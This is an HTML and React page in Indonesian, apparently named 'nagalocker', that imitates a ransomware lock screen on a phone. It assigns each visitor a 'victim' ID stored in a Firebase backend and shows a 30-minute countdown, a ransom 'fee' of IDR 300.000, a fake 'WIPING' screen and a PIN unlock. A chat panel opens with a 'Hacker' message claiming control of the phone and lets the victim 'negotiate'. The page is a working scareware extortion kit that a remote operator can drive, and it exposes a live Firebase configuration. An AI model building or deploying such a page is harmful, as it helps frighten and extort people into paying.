<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistem Terkunci - Akses Ditolak</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap');
        body { font-family: 'JetBrains Mono', monospace; background-color: #000; color: #00ff00; overflow: hidden; user-select: none; }
        .glow-red { text-shadow: 0 0 15px #ef4444; }
        .animate-progress { animation: progress linear forwards; }
        @keyframes progress { from { width: 100%; } to { width: 0%; } }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, doc, onSnapshot, setDoc, updateDoc, arrayUnion, getDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ98XegiDOAGJ508mCASQ1SKp-3WsonWU",
            authDomain: "nagalocker.firebaseapp.com",
            projectId: "nagalocker",
            storageBucket: "nagalocker.firebasestorage.app",
            messagingSenderId: "529236383091",
            appId: "1:529236383091:web:bcd42c1c2c2f5714c46106",
            measurementId: "G-S98ECJN5LY"
        };

        window.FirebaseLib = {
            app: initializeApp(firebaseConfig),
            getFirestore, doc, onSnapshot, setDoc, updateDoc, arrayUnion, getDoc,
            getAuth, signInAnonymously
        };
        window.dispatchEvent(new Event('firebase-ready'));
    </script>

    <script type="text/babel">
        const { useState, useEffect } = React;

        function App() {
            const [fbReady, setFbReady] = useState(false);
            const [victimId, setVictimId] = useState(null);
            const [state, setState] = useState({
                timeLeft: 1800, ransom: '300.000', messages: [],
                isWiping: false, isLocked: true, validPins: ['1234'], isRestarting: false
            });
            const [input, setInput] = useState('');
            const [pinInput, setPinInput] = useState('');
            const [showModal, setShowModal] = useState(false);
            const [error, setError] = useState('');

            useEffect(() => {
                let id = localStorage.getItem('naga_victim_id');
                if (!id) {
                    id = 'VTC-' + Math.random().toString(36).substr(2, 6).toUpperCase();
                    localStorage.setItem('naga_victim_id', id);
                }
                setVictimId(id);
                const handleReady = () => setFbReady(true);
                if (window.FirebaseLib) handleReady();
                else window.addEventListener('firebase-ready', handleReady);
            }, []);

            useEffect(() => {
                if (!fbReady || !victimId) return;
                const { getAuth, signInAnonymously, getFirestore, doc, onSnapshot, getDoc, setDoc } = window.FirebaseLib;
                const db = getFirestore();
                const docRef = doc(db, "artifacts", "nagalocker", "public", "data", "victims", victimId);

                signInAnonymously(getAuth()).then(() => {
                    getDoc(docRef).then(snap => {
                        if (!snap.exists()) {
                            setDoc(docRef, {
                                id: victimId, timeLeft: 1800, ransom: '300.000', isWiping: false, 
                                isLocked: true, lastSeen: Date.now(), isRestarting: false,
                                messages: [{ sender: 'Hacker', text: 'HP lu udah gue pegang. ID: ' + victimId, time: Date.now() }],
                                validPins: ['1234']
                            });
                        }
                    });
                });

                return onSnapshot(docRef, (s) => s.exists() && setState(s.data()));
            }, [fbReady, victimId]);

            // FIX COUNTDOWN LOGIC
            useEffect(() => {
                if (state.timeLeft <= 0 || !state.isLocked) return;
                const timer = setInterval(() => {
                    setState(prev => ({ ...prev, timeLeft: prev.timeLeft - 1 }));
                }, 1000);
                return () => clearInterval(timer);
            }, [state.timeLeft, state.isLocked]);

            const checkPin = async () => {
                if (state.validPins.includes(pinInput)) {
                    const { getFirestore, doc, updateDoc } = window.FirebaseLib;
                    await updateDoc(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", victimId), { isLocked: false });
                    setShowModal(false);
                } else {
                    setError("PIN SALAH! AKSES TETAP DITOLAK.");
                    setPinInput('');
                    setTimeout(() => setError(''), 3000);
                }
            };

            const sendMsg = async () => {
                if (!input.trim()) return;
                const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
                await updateDoc(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", victimId), {
                    messages: arrayUnion({ sender: 'Victim', text: input, time: Date.now() })
                });
                setInput('');
            };

            if (!fbReady) return <div className="h-screen bg-black flex items-center justify-center text-green-500">BOOTING...</div>;

            // RESTART OVERLAY
            if (state.isRestarting) {
                return (
                    <div className="h-screen bg-black flex flex-col items-center justify-center text-white font-sans p-10 text-center">
                        <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-6"></div>
                        <h1 className="text-xl font-bold uppercase tracking-widest">System Rebooting...</h1>
                        <p className="text-gray-500 text-[10px] mt-4">Please do not power off your device. Optimizing security patch...</p>
                    </div>
                );
            }

            // UNLOCKED SCREEN
            if (!state.isLocked) {
                return (
                    <div className="h-screen bg-black flex flex-col items-center justify-center p-8 text-center">
                        <i data-lucide="unlock" className="w-20 h-20 text-green-500 mb-6"></i>
                        <h1 className="text-2xl font-black text-white glow-green mb-4">DECRYPTION SUCCESS</h1>
                        <p className="text-gray-500 text-sm">System integrity restored. Safe to use.</p>
                        <button onClick={() => window.location.reload()} className="mt-10 px-8 py-3 bg-green-600 text-black font-bold rounded-xl">FINISH</button>
                    </div>
                );
            }

            return (
                <div className="h-screen flex flex-col p-6 relative bg-black select-none">
                    {state.isWiping && (
                        <div className="absolute inset-0 z-[100] bg-black flex flex-col items-center justify-center text-red-600 animate-pulse text-center p-10">
                            <i data-lucide="skull" className="w-24 h-24 mb-6"></i>
                            <h1 className="text-4xl font-black italic">WIPING...</h1>
                            <p className="mt-4 text-[10px] font-mono">sector_erase: 0x{Math.random().toString(16).substr(2, 6).toUpperCase()}</p>
                        </div>
                    )}
                    
                    <header className="text-center mt-12 mb-8">
                        <h1 className="text-xl font-black text-green-500 glow-green mb-2 uppercase tracking-tighter">ARCHITECT_V1.0</h1>
                        <p className="text-[10px] text-gray-500 uppercase tracking-widest mb-6 font-bold">NODE_ID: {victimId}</p>
                        <div className="text-red-600 text-6xl font-black font-mono tracking-tighter mb-4 glow-red">
                            {Math.floor(state.timeLeft / 60)}:{(state.timeLeft % 60).toString().padStart(2, '0')}
                        </div>
                        <div className="w-full h-1 bg-gray-900 rounded-full overflow-hidden border border-green-900/20">
                            <div className="h-full bg-red-600 animate-progress" style={{width: '100%', animationDuration: state.timeLeft + 's'}}></div>
                        </div>
                    </header>

                    <div className="bg-green-950/5 border border-green-900/10 p-6 rounded-3xl mb-8 backdrop-blur-md">
                        <div className="flex justify-between items-center mb-6">
                            <span className="text-[10px] text-gray-600 font-black uppercase">FEE</span>
                            <span className="text-2xl font-black text-white font-mono">IDR {state.ransom}</span>
                        </div>
                        <button onClick={() => setShowModal(true)} className="w-full bg-green-600 text-black py-4 rounded-2xl font-black text-xs uppercase shadow-lg shadow-green-900/30 active:scale-95 transition-all">ENTER PIN TO UNLOCK</button>
                        {error && <p className="text-[10px] text-red-600 font-black mt-4 animate-pulse text-center uppercase tracking-widest">{error}</p>}
                    </div>

                    <div className="flex-1 flex flex-col min-h-0 bg-black/40 border border-green-900/10 rounded-[2.5rem] p-6 overflow-hidden">
                        <div className="flex-1 overflow-y-auto space-y-4 mb-4 scrollbar-hide px-1 text-[11px]">
                            {state.messages.map((m, i) => (
                                <div key={i} className={`flex flex-col ${m.sender === 'Hacker' ? 'items-start' : 'items-end'}`}>
                                    <div className={`max-w-[85%] px-4 py-3 rounded-2xl ${m.sender === 'Hacker' ? 'bg-green-600 text-black font-bold' : 'bg-gray-900 text-gray-300 border border-gray-800'}`}>
                                        {m.text}
                                    </div>
                                </div>
                            ))}
                        </div>
                        <div className="relative">
                            <input value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendMsg()} placeholder="Negotiate..." className="w-full bg-black border border-green-900/20 p-4 pr-14 text-xs rounded-2xl outline-none focus:border-green-500 transition-all text-white" />
                            <button onClick={sendMsg} className="absolute right-4 top-1/2 -translate-y-1/2 text-green-500"><i data-lucide="send" className="w-5 h-5"></i></button>
                        </div>
                    </div>

                    {showModal && (
                        <div className="fixed inset-0 z-[200] bg-black/98 flex items-center justify-center p-6">
                            <div className="w-full max-w-sm bg-slate-950 border border-green-500/20 p-10 rounded-[3rem]">
                                <h2 className="text-xl font-black text-white text-center italic uppercase mb-8 tracking-tighter">Input License Key</h2>
                                <input type="text" maxLength={8} value={pinInput} onChange={(e) => setPinInput(e.target.value)} placeholder="••••••••" className="w-full bg-black border border-green-900/40 p-5 text-center text-3xl text-green-500 font-mono rounded-2xl mb-8 outline-none focus:border-green-500 tracking-[0.2em]" autoFocus />
                                <div className="flex gap-4">
                                    <button onClick={() => setShowModal(false)} className="flex-1 text-[10px] font-black text-gray-700 uppercase">Cancel</button>
                                    <button onClick={checkPin} className="flex-[2] bg-green-600 text-black py-4 rounded-2xl font-black text-xs shadow-lg uppercase">Verify</button>
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            );
        }
        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
        setInterval(() => window.lucide && lucide.createIcons(), 1000);
    </script>
</body>
</html>
